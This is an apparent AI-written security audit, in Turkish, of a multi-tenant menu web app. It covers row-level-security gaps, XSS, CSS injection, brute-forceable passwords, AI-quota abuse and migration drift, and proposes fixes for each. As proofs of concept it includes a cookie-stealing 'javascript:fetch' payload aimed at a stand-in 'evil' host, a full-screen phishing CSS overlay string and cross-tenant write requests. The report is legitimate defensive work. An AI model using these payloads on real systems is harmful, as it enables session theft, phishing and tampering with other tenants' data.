# Rotamenu — Yazılımsal Sağlık ve Güvenlik Denetimi

**Tarih:** 26 Ağustos 2026 · **Commit:** `78faf34` · **DB:** `vaqhdaaqdsgfajqdvzls`

Beş eksende denetim yapıldı: kimlik doğrulama/yetkilendirme, RLS ve veri erişimi,
girdi doğrulama/XSS/SSRF, sır yönetimi/ödeme/kota, yazılımsal sağlık.

**Doğrulama yöntemi:** Aşağıdaki bulguların önemli bir kısmı canlı veritabanında
`anon` ve `authenticated` rolleri simüle edilerek **fiilen test edildi** — kod
okumasına dayalı tahmin değil. Test edilenler ✅ ile işaretli. Test edilmemiş
olanlar "iddia" olarak ayrıldı.

---

## 0. Önce: bu oturumda kapatılan açık

**Çapraz-kiracı yazma — KRİTİK, kapatıldı ve kanıtlandı.**

İçerik tablolarının INSERT politikaları yalnız `org_id` sütununa bakıyordu ve
`org_id` istemciden geliyordu. `app.fill_org_id` trigger'ı da değeri yalnızca
null olduğunda ebeveynden dolduruyordu. Sonuç: kendi org'unda editor olan biri

```
POST /rest/v1/categories
{ "org_id": "<KENDİ ORG>", "menu_id": "<BAŞKA İŞLETMENİN MENÜSÜ>", "name": "..." }
```

yazabiliyor, satır kurbanın canlı menüsüne düşüyordu. `items`, `menus`,
`item_allergens`, `item_translations`, `qr_codes` aynı desendeydi — yani
**yabancı bir menüye sahte alerjen bilgisi enjekte etmek mümkündü.** Trigger
yalnız INSERT'te çalıştığı için ikinci bir yol daha vardı: kendi org'unda meşru
bir satır açıp `menu_id`'yi kurbanın menüsüne çevirmek (UPDATE ile
yeniden-ebeveynleme).

**Düzeltme:** `20260826091819_org_id_parent_authority.sql` — `org_id` artık
istemcinin söylediği değil, **üst kaydın söylediği** şeydir. Trigger her INSERT
ve UPDATE'te ebeveynden yeniden türetip gelen değerin üzerine yazar; RLS
`with check`'i böylece saldırganın kendi org'una değil kurbanın org'una karşı
değerlendirilir. 12 tabloya uygulandı.

**Kanıt (canlı DB'de çalıştırıldı):**

| Test | Sonuç |
|---|---|
| ✅ INSERT: kendi `org_id` + kurbanın `menu_id` | `42501: new row violates row-level security policy` |
| ✅ UPDATE: kendi kategorisini kurbanın menüsüne taşıma | `42501: new row violates row-level security policy` |
| ✅ Meşru sahip, kendi menüsü, yanlış `org_id` gönderiyor | **Başarılı** — trigger `org_id`'yi doğru org'a düzeltti |

Son satır önemli: meşru akışlar etkilenmedi. Test verisi geri alındı, artık kayıt
yok, mevcut veride değişiklik olmadı (81 kategori / 550 ürün / 9 menü sabit).

---

## 1. Şu anda canlı olan sorunlar

### 1.1 `qr_codes` tüm platforma açık — ✅ doğrulandı, ORTA

`qr_select` politikası `using (is_active or is_org_member(org_id))`. `is_published`
şartı yok. Anon anahtarla test edildi: **11 QR kaydının tamamı okunabiliyor** —
yayına alınmamış işletmeler dahil tüm `org_id`/`venue_id` eşlemeleri, masa
etiketleri, kayıt tarihleri. Rakip için tam müşteri portföyü.

Uygulamanın buna ihtiyacı yok: `/q/[code]` zaten service-role ile okuyor.

```sql
drop policy qr_select on public.qr_codes;
create policy qr_select on public.qr_codes for select
  using (app.is_org_member(org_id));
```

### 1.2 `venues_update`'te `WITH CHECK` ve sütun kısıtı yok — ✅ doğrulandı, YÜKSEK

Politika `using (is_org_member(org_id,'editor'))`, `with_check` **boş**. `anon`
anahtarı istemci paketinde açık olduğu için bir işletme sahibi Next.js
rotalarını hiç kullanmadan doğrudan PostgREST'e yazabilir:

```js
await supabase.from('venues').update({ is_suspended: false, is_published: true }).eq('id', venueId)
```

Yani **süper-admin'in askıya aldığı bir işletme askıyı kendi kaldırabilir.**
Aynı yolla `design_settings`, `google_maps_url`, `cover_url`, `logo_url` da
doğrudan yazılabiliyor — `/api/venue`'daki tüm zod doğrulaması ve
`isAllowedBackgroundImageUrl` kontrolü **atlanabiliyor**. Bu, 1.4'teki XSS'in
neden ciddi olduğunun da cevabı.

```sql
revoke update (is_suspended, pano_password_hash, org_id, published_at)
  on public.venues from authenticated, anon;
drop policy venues_update on public.venues;
create policy venues_update on public.venues for update
  using  (app.is_org_member(org_id,'editor'))
  with check (app.is_org_member(org_id,'editor'));
```

### 1.3 `members_insert` rol kısıtı yok → org içi yetki yükseltme — ✅ doğrulandı, ORTA

```
members_insert  with_check: app.is_org_member(org_id, 'admin')
```

Yazılacak `role` değeri hiç kısıtlanmıyor. `admin` rolündeki biri ikinci bir
hesaba `role = 'owner'` verebilir; o hesap artık org'u silebilir ve planı
değiştirebilir. `members_delete` admin'in owner **silmesini** engelliyor ama
owner **üretmesini** engellemiyor.

Düzeltme: `with check (app.is_org_member(org_id,'admin') and role <> 'owner')`.

### 1.4 `googleMapsUrl` şema doğrulaması yok → stored XSS — ✅ kod doğrulandı, YÜKSEK

`src/app/api/venue/route.ts:23`
```ts
googleMapsUrl: optStr(500),   // = z.string().trim().max(500).nullish()
```

Protokol/şema kontrolü yok. Diğer URL alanları `z.string().url()` +
`isAllowedBackgroundImageUrl()` ile korunmuş, bu alan atlanmış. Değer
`guest-menu.tsx:2233`'te doğrudan `href`'e giriyor. React `javascript:`
URL'lerini üretimde engellemiyor.

`javascript:fetch('https://evil/'+document.cookie)` yazıldığında, menü
alt bilgisindeki "Adres" bağlantısına tıklayan herkes — misafir, menüyü
inceleyen ajans çalışanı, süper-admin — aynı origin'de kod çalıştırır.
`/studyo` ve `/admin` aynı origin.

```ts
googleMapsUrl: z.string().trim().url()
  .refine((u) => /^https?:$/.test(new URL(u).protocol), 'Sadece http/https')
  .max(500).nullish(),
```
Ek olarak render tarafında bir `safeHref()` süzgeci (savunma iki katmanlı olmalı,
çünkü 1.2 nedeniyle API katmanı atlanabiliyor).

### 1.5 Güvenlik başlıkları hiç tanımlı değil — ✅ doğrulandı, YÜKSEK

`next.config.mjs`'de `headers()` yok, `netlify.toml`'da `[[headers]]` yok,
middleware başlık eklemiyor. Kod tabanında `content-security-policy`,
`x-frame-options`, `frame-ancestors`, `nosniff` için **sıfır** eşleşme.

Sonuç: `/m/[slug]`, `/studyo` ve `/admin` herhangi bir siteye iframe'e
gömülebilir (clickjacking; admin oturumu 12 saat). CSP olmadığı için 1.4 ve
1.6'daki enjeksiyonların hiçbir ikinci savunma katmanı yok.

### 1.6 CSS enjeksiyonu — font ve kapak değerleri satır içi `style`'a kaçışsız giriyor — ORTA

Üç nokta:
- `schemas/design.ts:26-27` → `headingFont`/`bodyFont` serbest metin. `FONT_OPTIONS`
  allowlist'i **var ama şema onu kullanmıyor**. `guest-menu.tsx:969` →
  `fontFamily: design.bodyFont` (kök kapsayıcı).
- `schemas/design.ts:55-59` → `backgroundImageUrl` yalnız ön ek kontrolünde;
  ön ekten sonrası serbest, `themes.ts:422`'de `url("...")` içine giriyor.
- `guest-menu.tsx:1102,2081` → `coverUrl` **hiç doğrulanmıyor** ve tırnaksız
  `url(${venue.coverUrl})`.

React satır içi `style` değerini yalnız HTML özniteliği olarak kaçırır;
tarayıcı entity'leri çözüp CSS'e verir, `;` filtrelenmez. `bodyFont` alanına
`Arial;position:fixed;top:0;left:0;width:100vw;height:100vw;z-index:9999;background:#fff url(https://evil/phish.png)`
yazmak menünün üzerine tam ekran sahte katman bindirir. 1.2 sayesinde bu değer
API doğrulamasını atlayarak doğrudan yazılabiliyor.

Düzeltme: fontları `z.enum(FONT_OPTIONS…)`; `backgroundImageUrl` ön ekten
sonrası için `^[A-Za-z0-9._\-/]+$`; `coverUrl` için aynı doğrulayıcı ve
`encodeURI()`. Ayrıca `themes.ts:386` `normalizeMenuDesign` şu an DB'den geleni
hiç doğrulamadan yayıyor — orada `menuDesignSchema.safeParse` çalıştırılmalı
(render tarafı savunması).

### 1.7 `/api/menu/extract-pages`: üyelik kontrolü ve AI kotası yok — YÜKSEK (maliyet)

Dosyada `consumeAiQuota` **hiç geçmiyor**. Karşılaştırma: `ingest`,
`image/generate`, `image/enhance`, `menu/translate`, `design/suggest` — hepsinde
kota var. İstek başına 10 sayfa `detail:'high'` vision.

Ayrıca yetki kapısı "üyelik" değil "venue görünürlüğü": `venues_select`
yayındaki her venue'yu herkese gösterdiği için `if (!venue)` bir yetki kontrolü
değil.

### 1.8 `/api/image/generate` yetki ve kotadan ÖNCE OpenAI çağırıyor — YÜKSEK (maliyet)

`image/generate/route.ts:80` ve `:94` — `describeDishInEnglish()` /
`describeCategoryBackground()` gerçek OpenAI çağrısı; üyelik kontrolü `:100`,
kota `:131`. Yani **403 dönmeden önce fatura üretiliyor**, kota da hiç
tüketilmediği için sınırsız tekrarlanabiliyor. Ürün UUID'leri misafir
menüsünün HTML'inde zaten var.

Düzeltme: iki `describe*` çağrısını üyelik + kota bloklarından sonraya taşı.

### 1.9 Anonim self-servis → sınırsız org → sınırsız AI kotası — YÜKSEK (maliyet)

`studyo/page.tsx:56` `signInAnonymously()` → `/api/bootstrap` yeni org açıyor →
`ai-quota.ts:53-58` `aiTierFor()` **her zaman `'paid'`** dönüyor. Kota anahtarı
`(org_id, gün, tür)` olduğu için **her yeni anonim oturum sayacı sıfırlıyor.**
Captcha yok, e-posta yok, IP sınırı yok.

`/studyo` adresini bilen herkes döngüde org açıp org başına günde 200 sayfa
OpenAI vision + 400 Runware görseli üretebilir. "Kapalı ajans aracı" varsayımı
kodda hiçbir yerde zorlanmıyor — middleware `/studyo`'yu korumuyor.

Bu, ajans moduna geçişin yan etkisi: `ai-quota.ts`'teki kimlik kapısı
(`anonymous` → `image: 0, translate: 0`) hâlâ dosyada duruyor ama `aiTierFor`
sabit `'paid'` döndüğü için **hiç çalışmıyor**.

### 1.10 `/api/venue/pano-auth`: kimliksiz, hız sınırsız, ADMIN_PASSWORD kabul ediyor — YÜKSEK

`pano-auth/route.ts:38` → `checkAdminPassword(password) || verifyPanoPassword(...)`.

Üçü bir arada: (a) uç tamamen public, (b) hız sınırı/gecikme/kilit **yok**
(`/api/admin/login`'de en azından 400 ms gecikme var, burada o bile yok),
(c) global `ADMIN_PASSWORD`'ü de kabul ediyor. Yani `/admin/login`'i hiç
dövmeden bu public uçtan süper-admin parolası sınırsız hızda denenebilir.
`venueId` için herhangi bir yayındaki id yeterli.

`ADMIN_PASSWORD` bulunursa: tüm kiracıların verisi, işletme silme, plan bypass,
platform geneli tasarım yazma. Aynı sorun `/api/design-presets/[templateId]`'de
de var (oturum yok, yalnız gövdedeki parola, gecikme yok).

Düzeltme: bu uçtan `checkAdminPassword` dalını kaldır (admin erişimi zaten
`isAdminSession()` üzerinden var), kalıcı (DB tabanlı) hız sınırı ekle, pano
şifresi minimumunu 4'ten en az 10'a çıkar.

---

## 2. Şu anda veri olmadığı için "uyuyan" açıklar

Bunlar gerçek politika boşlukları ama ilgili veri henüz var olmadığı için bugün
sızan bir şey yok. Veri oluştuğu an açılırlar.

| Açık | Durum | Test sonucu |
|---|---|---|
| `venues.pano_password_hash` anon'a açık (sütun kısıtı yok) | ✅ sorgu **başarılı**, 0 satır | Henüz hiçbir işletmede pano şifresi yok. İlk şifre tanımlandığı an hash herkese okunur → 4 karakter minimum ile sözlük saldırısı |
| `is_available=false` ürünler anon'a açık (RLS'te aktiflik şartı yok) | ✅ sorgu **başarılı**, 0 satır | Bir işletme ürün "gizlediği" an, gizlenen ürün ve fiyatı PostgREST'ten okunur |
| `is_active=false` menüler / kategoriler | ✅ aynı | Yayınlanmamış "Kış Menüsü" okunabilir olur |
| `organizations` UPDATE: `plan`, `trial_ends_at` kendine yazılabiliyor | politika doğrulandı | Ajans modunda limitler eşit olduğu için bugün etkisiz; limitler ayrıştığı gün ücretsiz Pro |
| Alerjen onayı RPC atlanarak sahte üretilebiliyor (`items.allergens_confirmed` ve `item_allergens.state` doğrudan yazılabiliyor) | politika doğrulandı | Misafirde "onaylı" rozeti çıkar, `item_compliance.reviewed_by` boş kalır — uyum denetiminde onay zinciri kanıtı yok |

Hepsinin ortak düzeltmesi: SELECT politikalarına aktiflik şartını eklemek ve
platform-kontrollü sütunlarda `revoke update (...) from authenticated, anon`.

---

## 3. Kapalı çıkanlar (endişe edilip test edilen, temiz)

- ✅ `setup_requests` — RLS açık, **0 politika**, 1 satır var, anon 0 görüyor. Kapalı.
- ✅ `subscriptions` — RLS açık, 5 satır, anon 0 görüyor. Kapalı.
- ✅ `menu_translation_jobs`, `design_preset_overrides`, `platform_settings` — RLS açık.
- `menu_ingestions.raw_result` (ham AI çıktısı) misafire **kapalı**.
- `item_compliance.ai_notes` kapalı; misafir yalnız `state='confirmed'` alerjen görüyor.
- Çapraz-org **DELETE** bulunamadı — tüm DELETE politikaları kendi org'unu istiyor.
- **Storage yol zorlaması gerçek**: `menu-uploads`/`venue-media` politikaları
  `split_part(name,'/',1)::uuid` ile org üyeliğini DB seviyesinde doğruluyor —
  yalnız kodda değil. Başka org'un klasörüne yazma/silme mümkün değil.
  `image/svg+xml` allowlist'te değil → depolanmış SVG XSS yolu kapalı.
- **SSRF yok** — sunucunun kullanıcıdan gelen URL'i çektiği hiçbir yer yok.
- **Sır sızıntısı yok** — tüm `NEXT_PUBLIC_*` kullanımları yalnız Supabase URL /
  anon key / site URL. Kodda sabit yazılmış sır yok. OpenAI anahtarı hata
  yollarına karışmıyor.
- **Arka plan fonksiyon imzası sağlam** — HMAC zamanlama-sabiti karşılaştırma
  (`timingSafeEqual`), dışarıdan tetiklenemiyor.
- **`consume_ai_quota` gerçekten atomik** — `insert … on conflict do update …
  where units + p_units <= p_limit` tek deyimde. Eşzamanlı isteklerle kota
  aşılamıyor; asıl bypass 1.9'daki org üretimi.
- **Webhook gövdesine güvenilmiyor**, durum iyzico'dan yeniden çekiliyor.
- `?previewDesign=` yolu `isOwnerViewing` kapısı + tam zod doğrulaması ile korunuyor.

---

## 4. Yazılımsal sağlık

### 4.1 Yetkilendirmede dört ayrı desen — YÜKSEK (işlevsel)

35 route'ta dört farklı yetki modeli var ve bu **ajans modunun ana senaryosunu
kırıyor**. Süper-admin (ADMIN_PASSWORD ile giren, Supabase kullanıcısı olmayan
ajans çalışanı) ve pano şifresiyle giren müşteri şunları **yapamıyor**, 401
alıyor:

- görsel yükleme, AI görsel üretme/iyileştirme
- kategori arka planı ayarlama
- AI tasarım önerisi
- QR PDF ve uyum raporu PDF indirme
- **işletme ayarlarını kaydetme ve menüyü yayına alma**
- menü taslağını onaylama

`api/venue/design/route.ts:22-29` yorumu bu hatayı zaten bir kez tespit edip
düzeltmiş ("admin panelinden tema seçilebiliyor ama kaydedilemiyordu"). Aynı
hata 15 route'ta hâlâ duruyor.

Çözüm: tek bir `authorizeVenue(venueId) → { db, mode }` yardımcısı
(`isAdminSession() || hasPanoSession(venueId)` → admin client, yoksa user client
+ RLS) ve 15 route'un ona geçirilmesi. Bu aynı zamanda 11 yerdeki kopyala-yapıştır
`organization_members` sorgusunu siler.

### 4.2 `approve` route'u transaction'sız yıkıcı yazma — YÜKSEK (veri kaybı)

Tek HTTP isteğinde 6 tabloya yazıyor, hiçbir transaction yok. Satır 341'de önce
`delete().eq('ingestion_id', …)` çalışıyor (cascade ile ürünler, alerjenler,
kalori onayları gidiyor), sonra insert'ler başlıyor. Araya bir hata girerse
`catch` bloğu kategorileri **tekrar siliyor** → onaylanmış menünün tamamı yok
oluyor, geri getirme yolu yok.

Bu oturumda bunun bir tetikleyicisini kapattım (silinmiş menü kimliğine yazma →
FK hatası → her "Yeniden Kaydet" aynı hatayı tekrarlıyordu). Ama mimari sorun
duruyor: tüm yazım bir Postgres fonksiyonuna taşınmalı, ya da silme en sona
alınmalı.

**Bağlantılı ikinci sorun:** `itemIds[idx]` ↔ `flatSnaps[idx]` eşlemesi,
PostgREST'in satırları insert sırasıyla döndürmesi varsayımına dayanıyor. Bu
garanti belgeli değil. Sıra kayarsa **alerjen onayları yanlış ürüne yapışır** —
gıda güvenliği açısından en kötü sessiz hata.

### 4.3 Migrasyon drifti — YÜKSEK

Depoda 23 migration dosyası var, canlıda 29 kayıt. Karşılaştırdım:

- Depoda olup canlıda **karşılığı olmayan**: `0007`–`0013` (7 dosya)
- Canlıda olup depoda dosyası **olmayan**: `20260730045200_venue_theme`,
  `20260813121010_design_preset_overrides`, `20260813143551_venue_pano_password`,
  `20260816032209_add_menus_icon`, `20260816032425_add_items_is_featured`,
  `20260816073914_add_ingestion_target_menu`, `20260816100518_add_venue_announcement`,
  `20260816100742_add_venue_story`, `20260821171440_privileged_compliance_rpc`,
  `20260821174718_fix_privileged_compliance_jwt_claim`,
  `20260821190535_venue_custom_fonts` (11 dosya)
- Aynı işin farklı zaman damgasıyla kaydedildiği yerler de var
  (`20260802212950` dosya ↔ `20260802213752` kayıt)

**Sonucu:** Boş bir Supabase projesine depodaki migration'ları uygulayıp kodu
çalıştırırsan uygulama açılmaz. Staging ortamı, PR önizlemesi ve felaket
kurtarma bugün **mümkün değil**. Ayrıca canlıdaki RLS politikaları kod
incelemesinde görünmüyor — politika kayması yakalanamaz.

Tek komutluk çözüm:
```
supabase db pull                                          # canlı şemayı baseline'a dök
supabase gen types typescript --linked > src/lib/database.types.ts
```
İkinci komut ayrıca `createClient<Database>()` ile 25 kadar `as unknown as
Record<string, unknown>` cast'ini derleme zamanında doğrulanır hale getirir.

### 4.4 Ölü kod: faturalama altyapısı tamamen ulaşılamaz — ORTA

`studyo/plan/page.tsx` ajans moduna çevrilirken `plan-client.tsx`'i (414 satır)
artık hiç import etmiyor. Zincir tamamen kopmuş:

`plan-client.tsx` → `api/billing/checkout|cancel|dev-upgrade|dev-downgrade|callback`
(5 route) → `lib/iyzico.ts` → `iyzipay` bağımlılığı → `next.config.mjs`'deki
`serverComponentsExternalPackages` istisnası. Hepsi silinebilir.

`plans.ts` içinde de ölü dallar var: `resolvePlanContext()` parametrelerini
kullanmıyor, `UPGRADE_MESSAGES`'ın 4 mesajı erişilemez, `showRestaurantBadge()`
hep false, `UnavailableNotice` hiç render edilemez, `loadOrgPlanUsage()` hiç
çağrılmıyor. Buna rağmen **16 dosya** hâlâ `trial_ends_at` kolonunu her istekte
DB'den çekiyor.

**Hukuki not:** `(marketing)/mesafeli-satis` ve `(marketing)/iade` sayfaları
hâlâ yayında ve footer'dan linkli; içerikleri `PRICING`'den "249 ₺/ay, 14 gün
deneme" beyan ediyor. Ürün satılmıyorken bu yanlış beyan. `gizlilik` sayfası da
hâlâ iyzico'yu veri işleyici sayıyor.

### 4.4 Hata yönetimi: 97'ye 26 — YÜKSEK (görünürlük)

97 Supabase çağrısı `const { data } = await …` ile `error`'ı **hiç okumadan**
ilerliyor; yalnız 26'sı `{ data, error }` alıyor. Örnek: `m/[slug]/page.tsx:77` —
venue sorgusu DB hatası verse kullanıcı gerçek nedeni gizleyen bir 404 görür.

35 route'un 22'si 500 dönüyor ve 20'si hiçbir şey loglamıyor (`console.*` tüm
kod tabanında 8 yerde). Netlify loglarında bir 500'ün nedenini bulmak imkânsız.

Ayrıca 13 uçta `details: err.message` ile Postgres/GoTrue iç mesajları istemciye
dönüyor — bunlar kolon adı, kısıt adı ve **RLS politika adı** içeriyor
(`new row violates row-level security policy "org_update" for table
"organizations"`). Saldırgan geçersiz istekler göndererek şemayı haritalayabilir.

### 4.5 Misafir menüsü sıcak yolu: 8 seri DB gidiş-dönüşü — YÜKSEK (performans)

`m/[slug]/page.tsx` `force-dynamic` ve şunu sırayla çalıştırıyor: venue →
`getUser()` → membership → organizations → menus → categories → items →
`Promise.all ×4` → **`await recordEvent()`**. QR okutan her misafir ~8 seri RTT
+ analitik yazımını bekliyor. `generateMetadata` ayrıca 9. bir sorgu yapıyor.
`createAdminClient()` tek istekte 3 kez ayrı örnekleniyor.

En kolay kazanç: `recordEvent`'i `await`'siz bırakmak.

`studyo/diller` sayfası da 4 saniyede bir `router.refresh()` yapıyor; her tur
7 sorgu, biri **menünün tüm ürünlerini** çekiyor (yalnız "kaç ürünün açıklaması
eksik" sayısı için). 300 ürünlü menüde 10 dakikalık çeviri = 150 tur × 300 satır.

### 4.6 Netlify fonksiyonları `@/` alias'ıyla import ediyor — doğrulanmalı

`menu-translate-background.mts` → `../../src/lib/ai/translate` → o da
`@/lib/ai/openai`. Netlify'ın esbuild bundler'ı `tsconfig` `paths` alias'larını
varsayılan olarak çözmez ve `netlify.toml`'da `[functions]` bloğu yok.

**Ama:** menü yükleme ve çeviri canlıda çalışıyor (Amigos 19 Ağustos'ta
çevrildi), yani alias pratikte çözülüyor. Bu bir risk, aktif bir hata değil.
Yine de göreli yola çevirmek ucuz bir sigorta.

### 4.7 Kaynak dosyada ham NUL baytı — ORTA

`api/ingest/[id]/approve/route.ts:27` — `snapKey` ayırıcısı olarak gerçek bir
`\x00` baytı gömülü (kaçış dizisi değil). Sonuç: `grep`/`ripgrep` dosyayı
"binary file matches" deyip **atlıyor** (bu denetim sırasında da atladı),
`git diff` binary muamelesi yapıyor, bazı editörler baytı sessizce düşürüp
anahtarları bozar. `' '` kaçış dizisiyle değiştirilmeli.

### 4.8 Alt denetçilerin yanlış çıkan iddiaları

Alt ajanlara kaynak ağacın yalnız bir bölümünü verdiğim için birkaç yanlış
pozitif üretti. Kayda geçsin diye düzeltiyorum:

- ❌ "tests/ klasörü yok, sıfır test var" → **`tests/rls.test.mjs` var (10 KB).**
  `npm run test:rls` çalışır durumda olabilir; kapsamı ayrıca değerlendirilmeli.
- ❌ "tsconfig.json yok" → **var** (609 bayt).
- ❌ "lockfile yok" → **`package-lock.json` var** (137 KB).
- ❌ "`src/server/fonts/**` yok" → **var** (DejaVuSans.ttf + Bold).
- ❌ "depoda yalnız 7 migration var" → **23 dosya var**; drift yine de gerçek (4.3).

---

## 5. Önerilen sıra

**Bugün (ucuz, yüksek etki):**

1. `qr_codes` SELECT politikasını daralt — tek satırlık SQL (1.1)
2. `venues_update`'e `with check` + hassas sütunlarda `revoke update` (1.2)
3. `members_insert`'e `role <> 'owner'` (1.3)
4. `googleMapsUrl` zod doğrulaması + `safeHref()` (1.4)
5. `next.config.mjs`'ye güvenlik başlıkları (1.5)
6. `/api/venue/pano-auth`'tan `checkAdminPassword` dalını kaldır (1.10)

**Bu hafta:**

7. `supabase db pull` + `gen types` — drift'i kapat (4.3)
8. `/studyo` anonim self-servis yolunu kapat + `aiTierFor` (1.9)
9. `image/generate`'te AI çağrılarını yetki/kota sonrasına al (1.8)
10. `extract-pages`'e üyelik + kota ekle (1.7)
11. Font/kapak/arka plan CSS enjeksiyonu (1.6)

**Sonra:**

12. Tek `authorizeVenue()` yardımcısı, 15 route'u geçir (4.1)
13. `approve` route'unu atomik hale getir (4.2)
14. Faturalama ölü kodunu sil, yasal sayfaları düzelt (4.4)
15. Misafir sıcak yolu ve `diller` polling optimizasyonu (4.5)
